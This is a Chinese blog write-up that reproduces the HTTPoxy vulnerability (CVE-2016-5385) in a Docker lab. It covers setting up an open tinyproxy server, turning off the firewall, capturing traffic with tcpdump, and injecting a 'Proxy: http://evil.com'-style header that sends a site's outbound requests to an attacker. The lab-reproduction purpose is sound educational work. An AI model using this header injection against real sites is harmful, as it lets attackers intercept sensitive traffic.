---
title: 复现HTTPoxy漏洞（CVE-2016-5385）
category: 
- 渗透测试
tags: 
- 漏洞复现
---

### 漏洞简介

根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上`HTTP_`前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的`HTTP_PROXY`值作为HTTP代理地址。于是，恶意用户通过提交`Proxy: http://evil.com`这样的HTTP头，将使用缺陷类库的网站的代理设置为`http://evil.com`，进而窃取数据包中可能存在的敏感信息。

参考链接：

- https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/README.zh-cn.md

为什么还要写这篇文章呢，因为网上许多关于这个漏洞的复现过程要不就照搬原作的(参考连接)要不就写的很含糊。自己在复现过程中也踩过一些坑，所以一起和大家分享下。复现日期-2021-02-15

### 环境搭建

- 使用docker一键搭建漏洞环境

```shell
docker-compose up -d
```

![image-20210215175754078](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215175754078.png)

部署成功后，访问index.php页面。抓包看到请求包如下：

![image-20210215232704278](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215232704278.png)

没有任何问题。接着按照笔者所说，加上proxy字段的值，观察返回的结果：

![image-20210215232856761](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215232856761.png)

在代理服务器上抓取到的流量包如下:

![image-20210215233016843](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215233016843.png)

懒得码了，直接说复现步骤吧。

### Step:

其实原理很简单。只需要你有一台稳定的http代理服务器。有很多朋友最终没有复现成功的原因都是卡在了这一步。这里和大家分享一下我的搭建步骤，仅供参考：

首先我用的是centos7 64位的vps。使用的代理工具是tinyproxy 轻量级代理工具。最终用来查看代理端口流量包的工具是tcpdump。一步一步来，力求没有差错：

- 安装tinyproxy

centos下是可以一键安装的，但是需要注意如果提示说软件包中找不到tinyproxy，需要使用如下命令启用Extras 仓库：

```shell
#CentOS and Red Hat Enterprise Linux 7.x
wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
sudo rpm -Uvh epel-release-latest-7*.rpm
```

接着安装tinyproxy:

```shell
yum install -y tinyproxy
```

- 配置tinyproxy

要复现这个漏洞需要我们设置代理服务器为所有人可以访问，具体需要配置的事项如下：

```shell
vim /etc/tinyproxy/tinyproxy.conf
Port 8888 #更改默认端口
#Allow 127.0.0.1  注释掉这行 表示允许所有host访问
DisableViaHeader Yes #见闻之一
```

接着关闭放火墙->设置端口访问->禁止防火墙自动重启

```shell
systemctl stop firewalld.service
iptables -A INPUT -p tcp --dport 8888 -j ACCEPT
systemctl disable firewalld.service 
```

接着启动代理服务->测试代理是否成功

```shell
systemctl start tinyproxy.service 
curl -x 155.138.xxx.xxx:7777 --connect-timeout 5 http://baidu.com#ip和端口改成你自己设置的
```

如果出现如下界面说明代理服务运行正常：

![image-20210215234817367](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210215234817367.png)

- 安装tcpdump

```shell
yum -y install tcpdump
```

接下来需要抓取代理服务器流经该端口的流量：这里演示一下使用tcpdump抓取主机上某网卡上的get、post请求：

```shell
tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
```

然后在发送到服务器请求包中加上proxy : http://xxx.xxx.xxx.xxx:port/ 

接着你就能在代理服务上看到抓到的流量包了。现在在回过头理解一下这个漏洞，是不是有更加清晰的认识了呢。

想进一步了解这个漏洞的原理、危害、请[移步](https://www.laruence.com/2016/07/19/3101.html)：

<!-- more -->